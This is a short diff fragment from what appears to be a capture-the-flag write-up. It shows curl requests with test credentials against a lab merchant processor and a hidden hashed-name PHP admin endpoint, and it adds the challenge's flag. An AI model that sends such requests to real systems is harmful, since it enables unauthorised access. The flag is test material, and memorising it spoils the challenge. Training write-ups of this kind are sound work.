@@ -95,3 +95,5 @@ curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=.
 curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=.
 curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/327a6c4304ad5938eaf0efb6cc3e53dc.php?admin=sure
 ```
+
+The flag is `DORF18{Y0UR_5H3LL_15_1N_4N0TH3R_C45TL3}`.
